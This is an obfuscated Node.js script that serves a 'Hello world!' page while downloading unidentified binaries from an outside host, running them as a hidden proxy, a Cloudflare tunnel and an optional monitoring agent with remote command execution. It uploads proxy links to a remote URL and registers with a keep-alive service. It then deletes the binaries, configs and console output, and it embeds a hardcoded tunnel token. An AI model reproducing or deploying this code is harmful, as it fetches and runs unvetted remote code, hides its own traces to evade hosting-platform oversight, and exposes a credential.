const _0x569a4c=_0x2048;(function(_0xf7cf6a,_0x3c475a){const _0x1e1c88=_0x2048,_0x26ac40=_0xf7cf6a();while(!![]){try{const _0x879703=-parseInt(_0x1e1c88(0x237))/0x1*(parseInt(_0x1e1c88(0x1f8))/0x2)+-parseInt(_0x1e1c88(0x209))/0x3+-parseInt(_0x1e1c88(0x20e))/0x4+-parseInt(_0x1e1c88(0x26f))/0x5+-parseInt(_0x1e1c88(0x1fd))/0x6*(-parseInt(_0x1e1c88(0x276))/0x7)+-parseInt(_0x1e1c88(0x269))/0x8+parseInt(_0x1e1c88(0x1ea))/0x9;if(_0x879703===_0x3c475a)break;else _0x26ac40['push'](_0x26ac40['shift']());}catch(_0xd12ea3){_0x26ac40['push'](_0x26ac40['shift']());}}}(_0x16bf,0xb5ab1));const express=require(_0x569a4c(0x1cd)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x569a4c(0x1db)),{promisify}=require(_0x569a4c(0x262)),exec=promisify(require(_0x569a4c(0x245))['exec']),{execSync}=require(_0x569a4c(0x245)),UPLOAD_URL=process['env'][_0x569a4c(0x239)]||'',PROJECT_URL=process[_0x569a4c(0x1fb)][_0x569a4c(0x277)]||'',AUTO_ACCESS=process[_0x569a4c(0x1fb)][_0x569a4c(0x25f)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x569a4c(0x1e2),SUB_PATH=process[_0x569a4c(0x1fb)]['SUB_PATH']||'abc',PORT=process[_0x569a4c(0x1fb)][_0x569a4c(0x1d7)]||process[_0x569a4c(0x1fb)][_0x569a4c(0x206)]||0xbb8,UUID=process[_0x569a4c(0x1fb)][_0x569a4c(0x22a)]||'4bf42764-b46a-4a48-a2db-b753e7e89d0a',NEZHA_SERVER=process[_0x569a4c(0x1fb)][_0x569a4c(0x26b)]||'',NEZHA_PORT=process[_0x569a4c(0x1fb)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x569a4c(0x1fb)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x569a4c(0x1fb)]['ARGO_DOMAIN']||_0x569a4c(0x1e7),ARGO_AUTH=process[_0x569a4c(0x1fb)]['ARGO_AUTH']||_0x569a4c(0x22c),ARGO_PORT=process[_0x569a4c(0x1fb)][_0x569a4c(0x207)]||0x1f41,CFIP=process[_0x569a4c(0x1fb)][_0x569a4c(0x1d6)]||_0x569a4c(0x25e),CFPORT=process[_0x569a4c(0x1fb)][_0x569a4c(0x20b)]||0x1bb,NAME=process[_0x569a4c(0x1fb)][_0x569a4c(0x1e6)]||'Leaflow';!fs[_0x569a4c(0x223)](FILE_PATH)?(fs[_0x569a4c(0x226)](FILE_PATH),console[_0x569a4c(0x1de)](FILE_PATH+_0x569a4c(0x251))):console['log'](FILE_PATH+_0x569a4c(0x270));function generateRandomName(){const _0x274902=_0x569a4c,_0x91a186='abcdefghijklmnopqrstuvwxyz';let _0x3bf55c='';for(let _0x41f62=0x0;_0x41f62<0x6;_0x41f62++){_0x3bf55c+=_0x91a186['charAt'](Math[_0x274902(0x23b)](Math[_0x274902(0x274)]()*_0x91a186[_0x274902(0x264)]));}return _0x3bf55c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x569a4c(0x257)](FILE_PATH,npmName),phpPath=path[_0x569a4c(0x257)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x569a4c(0x257)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x569a4c(0x203)),listPath=path[_0x569a4c(0x257)](FILE_PATH,_0x569a4c(0x1e9)),bootLogPath=path[_0x569a4c(0x257)](FILE_PATH,'boot.log'),configPath=path[_0x569a4c(0x257)](FILE_PATH,_0x569a4c(0x211));function deleteNodes(){const _0x5a1e2b=_0x569a4c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x858530;try{_0x858530=fs[_0x5a1e2b(0x1d1)](subPath,_0x5a1e2b(0x20d));}catch{return null;}const _0x580072=Buffer[_0x5a1e2b(0x252)](_0x858530,'base64')[_0x5a1e2b(0x1ed)](_0x5a1e2b(0x20d)),_0x590592=_0x580072[_0x5a1e2b(0x1fa)]('\x0a')[_0x5a1e2b(0x1f4)](_0x421056=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5a1e2b(0x1d5)](_0x421056));if(_0x590592[_0x5a1e2b(0x264)]===0x0)return;return axios[_0x5a1e2b(0x23d)](UPLOAD_URL+_0x5a1e2b(0x1ee),JSON['stringify']({'nodes':_0x590592}),{'headers':{'Content-Type':_0x5a1e2b(0x232)}})[_0x5a1e2b(0x1f0)](_0x26d5cc=>{return null;}),null;}catch(_0x1124cf){return null;}}function cleanupOldFiles(){const _0x37d296=_0x569a4c;try{const _0x64d437=fs['readdirSync'](FILE_PATH);_0x64d437[_0x37d296(0x1cb)](_0x363177=>{const _0x171613=_0x37d296,_0x38e749=path['join'](FILE_PATH,_0x363177);try{const _0x1be126=fs[_0x171613(0x228)](_0x38e749);_0x1be126[_0x171613(0x1ec)]()&&fs[_0x171613(0x258)](_0x38e749);}catch(_0x26ce4e){}});}catch(_0x1e4e16){}}app[_0x569a4c(0x1e1)]('/',function(_0x421811,_0x340f4a){const _0x38dd90=_0x569a4c;_0x340f4a['send'](_0x38dd90(0x272));});async function generateConfig(){const _0x93cf96=_0x569a4c,_0x53fc68={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x93cf96(0x253)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x93cf96(0x1ce),'settings':{'clients':[{'id':UUID,'flow':_0x93cf96(0x1e4)}],'decryption':_0x93cf96(0x253),'fallbacks':[{'dest':0xbb9},{'path':_0x93cf96(0x1fc),'dest':0xbba},{'path':_0x93cf96(0x25c),'dest':0xbbb},{'path':_0x93cf96(0x1cf),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x93cf96(0x253)},'streamSettings':{'network':_0x93cf96(0x1f3),'security':'none'}},{'port':0xbba,'listen':_0x93cf96(0x20a),'protocol':_0x93cf96(0x1ce),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x93cf96(0x253)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x93cf96(0x1fc)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x93cf96(0x233),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x93cf96(0x221),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x93cf96(0x25c)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x93cf96(0x242)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x93cf96(0x20a),'protocol':_0x93cf96(0x20c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x93cf96(0x253),'wsSettings':{'path':_0x93cf96(0x1cf)}},'sniffing':{'enabled':!![],'destOverride':[_0x93cf96(0x23e),_0x93cf96(0x233),_0x93cf96(0x242)],'metadataOnly':![]}}],'dns':{'servers':[_0x93cf96(0x23c)]},'outbounds':[{'protocol':_0x93cf96(0x275),'tag':_0x93cf96(0x1d4)},{'protocol':'blackhole','tag':_0x93cf96(0x1ef)}]};fs[_0x93cf96(0x278)](path[_0x93cf96(0x257)](FILE_PATH,'config.json'),JSON[_0x93cf96(0x1dc)](_0x53fc68,null,0x2));}function getSystemArchitecture(){const _0x3473e4=_0x569a4c,_0x1a9d09=os['arch']();return _0x1a9d09==='arm'||_0x1a9d09==='arm64'||_0x1a9d09===_0x3473e4(0x1df)?_0x3473e4(0x256):'amd';}function _0x16bf(){const _0x2a13f9=['&path=%2Ftrojan-argo%3Fed%3D2560#','\x20>\x20nul\x202>&1','/sub.txt\x20saved\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','forEach','then','express','vless','/trojan-argo','Add\x20automatic\x20access\x20task\x20faild:\x20','readFileSync','\x20>/dev/null\x202>&1\x20&','close','direct','test','CFIP','SERVER_PORT','map','ArgoDomain:','npm\x20running\x20error:\x20','path','stringify','fileName','log','aarch64','all','get','./tmp','Unhandled\x20error\x20in\x20startserver:','xtls-rprx-vision','unlink','NAME','leaflow.slkapi.dpdns.org','\x0avless://','list.txt','41390424VorsOp','\x0a\x20\x20credentials-file:\x20','isFile','toString','/api/delete-nodes','block','catch','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','countryCode','tcp','filter','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','true','443','339862GnSTTq','firefox','split','env','/vless-argo','6GBLVLi','push','match','nohup\x20','substring','tunnel.yml','sub.txt','basename','pipe','PORT','ARGO_PORT','platform','2716506nPDiPQ','127.0.0.1','CFPORT','trojan','utf-8','4573156DKBFRb','taskkill\x20/f\x20/im\x20','Error\x20reading\x20boot.log:','config.json','del\x20/f\x20/q\x20','https://ipapi.co/json/','finish','2087','https://amd64.ssss.nyc.mn/bot','\x20failed:\x20','has','https://arm64.ssss.nyc.mn/web','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2083','stream','Unknown','\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/config.json\x20>/dev/null\x202>&1\x20&','vmess','Nodes\x20uploaded\x20successfully','existsSync','message','error','mkdirSync','clear','statSync','web\x20running\x20error:\x20','UUID','/vmess-argo?ed=2560','eyJhIjoiZDIxZTIzNjFlYmNhMTEwNDU5YzNkODZiNDA0Yzc4NWIiLCJ0IjoiNzYzZDI5OGItNGU3Ny00ZWE4LTkyZGYtNzQ1MzEwZDQwNWFmIiwicyI6Ik1qQmxOMlJpWWprdE9USXlPUzAwWVRNM0xUZ3laVFF0TnpSak5qSm1ZMkl6T1RRMSJ9','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2096','8443','success','\x0a\x0avmess://','application/json','tls','pkill\x20-f\x20\x22[','?encryption=none&security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','5QNavwn','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','UPLOAD_URL','send','floor','https+local://8.8.8.8/dns-query','post','http','.exe\x20>\x20nul\x202>&1','Error\x20downloading\x20files:','data','quic','boot.log','\x0a\x20\x20tunnel:\x20','child_process','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','--tls','false','https://amd64.ssss.nyc.mn/v1','/tunnel.yml\x20run','Download\x20','includes','?security=tls&sni=','text/plain;\x20charset=utf-8','\x0aclient_secret:\x20','https://arm64.ssss.nyc.mn/bot','\x20is\x20created','from','none','status','response','arm','join','unlinkSync','/api/add-nodes','https://arm64.ssss.nyc.mn/v1','pop','/vmess-argo','/api/add-subscriptions','cdns.doon.eu.org','AUTO_ACCESS','2053','php\x20running\x20error:\x20','util','org','length','charAt','Empowerment\x20failed\x20for\x20','https://oooo.serv00.net/add-url','\x20-s\x20','8420808qxoAjr','http\x20server\x20is\x20running\x20on\x20port:','NEZHA_SERVER','Error\x20in\x20startserver:','unshift','Error\x20executing\x20command:\x20','1721775cWmlKj','\x20already\x20exists','set','Hello\x20world!','App\x20is\x20running','random','freedom','3084053YksYuM','PROJECT_URL','writeFileSync','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'];_0x16bf=function(){return _0x2a13f9;};return _0x16bf();}function downloadFile(_0x401066,_0x29392d,_0x21a7dd){const _0x58c0aa=_0x569a4c,_0x654a6f=_0x401066;!fs[_0x58c0aa(0x223)](FILE_PATH)&&fs[_0x58c0aa(0x226)](FILE_PATH,{'recursive':!![]});const _0x342133=fs['createWriteStream'](_0x654a6f);axios({'method':_0x58c0aa(0x1e1),'url':_0x29392d,'responseType':_0x58c0aa(0x21c)})[_0x58c0aa(0x1cc)](_0x1c182a=>{const _0x284085=_0x58c0aa;_0x1c182a[_0x284085(0x241)][_0x284085(0x205)](_0x342133),_0x342133['on'](_0x284085(0x214),()=>{const _0x3f07a5=_0x284085;_0x342133[_0x3f07a5(0x1d3)](),console[_0x3f07a5(0x1de)](_0x3f07a5(0x24b)+path['basename'](_0x654a6f)+'\x20successfully'),_0x21a7dd(null,_0x654a6f);}),_0x342133['on'](_0x284085(0x225),_0x5c9d03=>{const _0x7696f3=_0x284085;fs[_0x7696f3(0x1e5)](_0x654a6f,()=>{});const _0x3212f3='Download\x20'+path['basename'](_0x654a6f)+'\x20failed:\x20'+_0x5c9d03['message'];console['error'](_0x3212f3),_0x21a7dd(_0x3212f3);});})[_0x58c0aa(0x1f0)](_0x13bbc2=>{const _0x34429c=_0x58c0aa,_0x247482='Download\x20'+path[_0x34429c(0x204)](_0x654a6f)+_0x34429c(0x217)+_0x13bbc2[_0x34429c(0x224)];console[_0x34429c(0x225)](_0x247482),_0x21a7dd(_0x247482);});}async function downloadFilesAndRun(){const _0x260550=_0x569a4c,_0x19cdc0=getSystemArchitecture(),_0x3d9df7=getFilesForArchitecture(_0x19cdc0);if(_0x3d9df7[_0x260550(0x264)]===0x0){console[_0x260550(0x1de)](_0x260550(0x22d));return;}const _0x3bb4e0=_0x3d9df7[_0x260550(0x1d8)](_0x3e55c7=>{return new Promise((_0x293ae9,_0x49608e)=>{const _0x4a7a6f=_0x2048;downloadFile(_0x3e55c7[_0x4a7a6f(0x1dd)],_0x3e55c7['fileUrl'],(_0x1bff9d,_0x58839c)=>{_0x1bff9d?_0x49608e(_0x1bff9d):_0x293ae9(_0x58839c);});});});try{await Promise[_0x260550(0x1e0)](_0x3bb4e0);}catch(_0x1d6274){console['error'](_0x260550(0x240),_0x1d6274);return;}function _0xfe2060(_0x4563c1){const _0x1d0565=0x1fd;_0x4563c1['forEach'](_0x20d649=>{fs['existsSync'](_0x20d649)&&fs['chmod'](_0x20d649,_0x1d0565,_0x416602=>{const _0x4eb34b=_0x2048;_0x416602?console[_0x4eb34b(0x225)](_0x4eb34b(0x266)+_0x20d649+':\x20'+_0x416602):console[_0x4eb34b(0x1de)]('Empowerment\x20success\x20for\x20'+_0x20d649+':\x20'+_0x1d0565[_0x4eb34b(0x1ed)](0x8));});});}const _0x4532c5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xfe2060(_0x4532c5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1e59d9=NEZHA_SERVER[_0x260550(0x24c)](':')?NEZHA_SERVER[_0x260550(0x1fa)](':')[_0x260550(0x25b)]():'',_0x479a35=new Set([_0x260550(0x1f7),_0x260550(0x22f),'2096','2087','2083',_0x260550(0x260)]),_0x4a17ed=_0x479a35[_0x260550(0x218)](_0x1e59d9)?_0x260550(0x1f6):_0x260550(0x248),_0x3ee400=_0x260550(0x24f)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x260550(0x246)+_0x4a17ed+_0x260550(0x27a)+UUID;fs[_0x260550(0x278)](path[_0x260550(0x257)](FILE_PATH,'config.yaml'),_0x3ee400);const _0x5c2005=_0x260550(0x200)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x260550(0x21a);try{await exec(_0x5c2005),console[_0x260550(0x1de)](phpName+_0x260550(0x21e)),await new Promise(_0x200883=>setTimeout(_0x200883,0x3e8));}catch(_0x6ad48f){console[_0x260550(0x225)](_0x260550(0x261)+_0x6ad48f);}}else{let _0xee7095='';const _0x28cf94=[_0x260550(0x1f7),_0x260550(0x22f),_0x260550(0x22e),_0x260550(0x215),_0x260550(0x21b),_0x260550(0x260)];_0x28cf94[_0x260550(0x24c)](NEZHA_PORT)&&(_0xee7095=_0x260550(0x247));const _0x120cc4=_0x260550(0x200)+npmPath+_0x260550(0x268)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xee7095+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x120cc4),console[_0x260550(0x1de)](npmName+'\x20is\x20running'),await new Promise(_0x3249f8=>setTimeout(_0x3249f8,0x3e8));}catch(_0x2e8544){console[_0x260550(0x225)](_0x260550(0x1da)+_0x2e8544);}}}else console[_0x260550(0x1de)](_0x260550(0x279));const _0x599fbb=_0x260550(0x200)+webPath+'\x20-c\x20'+FILE_PATH+_0x260550(0x220);try{await exec(_0x599fbb),console[_0x260550(0x1de)](webName+'\x20is\x20running'),await new Promise(_0x4e2c84=>setTimeout(_0x4e2c84,0x3e8));}catch(_0x567897){console[_0x260550(0x225)](_0x260550(0x229)+_0x567897);}if(fs['existsSync'](botPath)){let _0x1cd034;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1cd034=_0x260550(0x21f)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1cd034=_0x260550(0x1ca)+FILE_PATH+_0x260550(0x24a):_0x1cd034=_0x260550(0x236)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1cd034+_0x260550(0x1d2)),console[_0x260550(0x1de)](botName+_0x260550(0x21e)),await new Promise(_0x4a54cc=>setTimeout(_0x4a54cc,0x7d0));}catch(_0x1f0eea){console[_0x260550(0x225)]('Error\x20executing\x20command:\x20'+_0x1f0eea);}}await new Promise(_0xcf2adc=>setTimeout(_0xcf2adc,0x1388));}function getFilesForArchitecture(_0x113ff5){const _0x20e476=_0x569a4c;let _0xb4407f;_0x113ff5===_0x20e476(0x256)?_0xb4407f=[{'fileName':webPath,'fileUrl':_0x20e476(0x219)},{'fileName':botPath,'fileUrl':_0x20e476(0x250)}]:_0xb4407f=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x20e476(0x216)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3a88b9=_0x113ff5===_0x20e476(0x256)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0xb4407f[_0x20e476(0x26d)]({'fileName':npmPath,'fileUrl':_0x3a88b9});}else{const _0x366ae7=_0x113ff5===_0x20e476(0x256)?_0x20e476(0x25a):_0x20e476(0x249);_0xb4407f[_0x20e476(0x26d)]({'fileName':phpPath,'fileUrl':_0x366ae7});}}return _0xb4407f;}function argoType(){const _0x2205b8=_0x569a4c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2205b8(0x1de)](_0x2205b8(0x1f5));return;}if(ARGO_AUTH[_0x2205b8(0x24c)]('TunnelSecret')){fs[_0x2205b8(0x278)](path[_0x2205b8(0x257)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x5008da=_0x2205b8(0x244)+ARGO_AUTH[_0x2205b8(0x1fa)]('\x22')[0xb]+_0x2205b8(0x1eb)+path[_0x2205b8(0x257)](FILE_PATH,'tunnel.json')+_0x2205b8(0x238)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x2205b8(0x257)](FILE_PATH,_0x2205b8(0x202)),_0x5008da);}else console[_0x2205b8(0x1de)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0xc50365=_0x569a4c;let _0x1c5cbc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1c5cbc=ARGO_DOMAIN,console[_0xc50365(0x1de)]('ARGO_DOMAIN:',_0x1c5cbc),await _0x14b4e5(_0x1c5cbc);else try{const _0x4fdae5=fs[_0xc50365(0x1d1)](path[_0xc50365(0x257)](FILE_PATH,'boot.log'),_0xc50365(0x20d)),_0x4c05f0=_0x4fdae5[_0xc50365(0x1fa)]('\x0a'),_0x41187d=[];_0x4c05f0[_0xc50365(0x1cb)](_0x117369=>{const _0x332c3b=_0xc50365,_0x5d9641=_0x117369[_0x332c3b(0x1ff)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5d9641){const _0x441b7b=_0x5d9641[0x1];_0x41187d[_0x332c3b(0x1fe)](_0x441b7b);}});if(_0x41187d[_0xc50365(0x264)]>0x0)_0x1c5cbc=_0x41187d[0x0],console[_0xc50365(0x1de)](_0xc50365(0x1d9),_0x1c5cbc),await _0x14b4e5(_0x1c5cbc);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0xc50365(0x258)](path['join'](FILE_PATH,_0xc50365(0x243)));async function _0x49f02b(){const _0x41d770=_0xc50365;try{process['platform']==='win32'?await exec(_0x41d770(0x20f)+botName+_0x41d770(0x23f)):await exec(_0x41d770(0x234)+botName[_0x41d770(0x265)](0x0)+']'+botName[_0x41d770(0x201)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x525193){}}_0x49f02b(),await new Promise(_0x2382ef=>setTimeout(_0x2382ef,0xbb8));const _0x39368a=_0xc50365(0x236)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xc50365(0x200)+botPath+'\x20'+_0x39368a+_0xc50365(0x1d2)),console['log'](botName+_0xc50365(0x21e)),await new Promise(_0x32d2ec=>setTimeout(_0x32d2ec,0xbb8)),await extractDomains();}catch(_0xa6bc2e){console[_0xc50365(0x225)](_0xc50365(0x26e)+_0xa6bc2e);}}}catch(_0xa92e16){console[_0xc50365(0x225)](_0xc50365(0x210),_0xa92e16);}async function _0x8a8219(){const _0x5b8265=_0xc50365;try{const _0x36cff4=await axios[_0x5b8265(0x1e1)](_0x5b8265(0x213),{'timeout':0xbb8});if(_0x36cff4[_0x5b8265(0x241)]&&_0x36cff4[_0x5b8265(0x241)]['country_code']&&_0x36cff4[_0x5b8265(0x241)][_0x5b8265(0x263)])return _0x36cff4[_0x5b8265(0x241)]['country_code']+'_'+_0x36cff4[_0x5b8265(0x241)]['org'];}catch(_0x22f1b4){try{const _0x24a824=await axios[_0x5b8265(0x1e1)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x24a824[_0x5b8265(0x241)]&&_0x24a824[_0x5b8265(0x241)][_0x5b8265(0x254)]===_0x5b8265(0x230)&&_0x24a824[_0x5b8265(0x241)][_0x5b8265(0x1f2)]&&_0x24a824[_0x5b8265(0x241)][_0x5b8265(0x263)])return _0x24a824['data'][_0x5b8265(0x1f2)]+'_'+_0x24a824['data'][_0x5b8265(0x263)];}catch(_0x404e63){}}return _0x5b8265(0x21d);}async function _0x14b4e5(_0x45d702){const _0x5b8165=await _0x8a8219(),_0x34644a=NAME?NAME+'-'+_0x5b8165:_0x5b8165;return new Promise(_0x54a29d=>{setTimeout(()=>{const _0x176891=_0x2048,_0x1c8942={'v':'2','ps':''+_0x34644a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x176891(0x253),'net':'ws','type':'none','host':_0x45d702,'path':_0x176891(0x22b),'tls':_0x176891(0x233),'sni':_0x45d702,'alpn':'','fp':_0x176891(0x1f9)},_0x35c83f=_0x176891(0x1e8)+UUID+'@'+CFIP+':'+CFPORT+_0x176891(0x235)+_0x45d702+'&fp=firefox&type=ws&host='+_0x45d702+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x34644a+_0x176891(0x231)+Buffer[_0x176891(0x252)](JSON[_0x176891(0x1dc)](_0x1c8942))['toString']('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x176891(0x24d)+_0x45d702+'&fp=firefox&type=ws&host='+_0x45d702+_0x176891(0x27b)+_0x34644a+'\x0a\x20\x20\x20\x20';console[_0x176891(0x1de)](Buffer['from'](_0x35c83f)[_0x176891(0x1ed)]('base64')),fs['writeFileSync'](subPath,Buffer['from'](_0x35c83f)[_0x176891(0x1ed)]('base64')),console[_0x176891(0x1de)](FILE_PATH+_0x176891(0x1c9)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x221ba0,_0x3a682d)=>{const _0x39d374=_0x176891,_0x2fcc82=Buffer[_0x39d374(0x252)](_0x35c83f)['toString']('base64');_0x3a682d[_0x39d374(0x271)]('Content-Type',_0x39d374(0x24e)),_0x3a682d[_0x39d374(0x23a)](_0x2fcc82);}),_0x54a29d(_0x35c83f);},0x7d0);});}}async function uploadNodes(){const _0x454f10=_0x569a4c;if(UPLOAD_URL&&PROJECT_URL){const _0xefcbcc=PROJECT_URL+'/'+SUB_PATH,_0x3f0914={'subscription':[_0xefcbcc]};try{const _0x1f940e=await axios[_0x454f10(0x23d)](UPLOAD_URL+_0x454f10(0x25d),_0x3f0914,{'headers':{'Content-Type':_0x454f10(0x232)}});return _0x1f940e&&_0x1f940e['status']===0xc8?(console[_0x454f10(0x1de)]('Subscription\x20uploaded\x20successfully'),_0x1f940e):null;}catch(_0x3231b4){if(_0x3231b4[_0x454f10(0x255)]){if(_0x3231b4['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x454f10(0x223)](listPath))return;const _0xb93fbf=fs[_0x454f10(0x1d1)](listPath,_0x454f10(0x20d)),_0x4baf42=_0xb93fbf['split']('\x0a')[_0x454f10(0x1f4)](_0x3c1322=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3c1322));if(_0x4baf42[_0x454f10(0x264)]===0x0)return;const _0x431917=JSON[_0x454f10(0x1dc)]({'nodes':_0x4baf42});try{const _0x5952cb=await axios[_0x454f10(0x23d)](UPLOAD_URL+_0x454f10(0x259),_0x431917,{'headers':{'Content-Type':'application/json'}});return _0x5952cb&&_0x5952cb[_0x454f10(0x254)]===0xc8?(console[_0x454f10(0x1de)](_0x454f10(0x222)),_0x5952cb):null;}catch(_0x1f8612){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x371a6d=_0x2048,_0x128afd=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x128afd[_0x371a6d(0x1fe)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x128afd[_0x371a6d(0x1fe)](phpPath);process[_0x371a6d(0x208)]==='win32'?exec(_0x371a6d(0x212)+_0x128afd['join']('\x20')+_0x371a6d(0x1c8),_0xf73f23=>{const _0x5354b6=_0x371a6d;console['clear'](),console[_0x5354b6(0x1de)](_0x5354b6(0x273)),console[_0x5354b6(0x1de)](_0x5354b6(0x1f1));}):exec('rm\x20-rf\x20'+_0x128afd[_0x371a6d(0x257)]('\x20')+'\x20>/dev/null\x202>&1',_0x12b10c=>{const _0x579359=_0x371a6d;console[_0x579359(0x227)](),console[_0x579359(0x1de)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x45232a=_0x569a4c;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x115bb9=await axios['post'](_0x45232a(0x267),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x45232a(0x232)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x115bb9;}catch(_0x1b3add){return console[_0x45232a(0x225)](_0x45232a(0x1d0)+_0x1b3add[_0x45232a(0x224)]),null;}}function _0x2048(_0x208a6f,_0x1734e0){_0x208a6f=_0x208a6f-0x1c8;const _0x16bfd0=_0x16bf();let _0x20482e=_0x16bfd0[_0x208a6f];return _0x20482e;}async function startserver(){const _0x4b99f1=_0x569a4c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x475bdd){console['error'](_0x4b99f1(0x26c),_0x475bdd);}}startserver()[_0x569a4c(0x1f0)](_0x2bed4f=>{const _0x48d600=_0x569a4c;console['error'](_0x48d600(0x1e3),_0x2bed4f);}),app['listen'](PORT,()=>console[_0x569a4c(0x1de)](_0x569a4c(0x26a)+PORT+'!'));
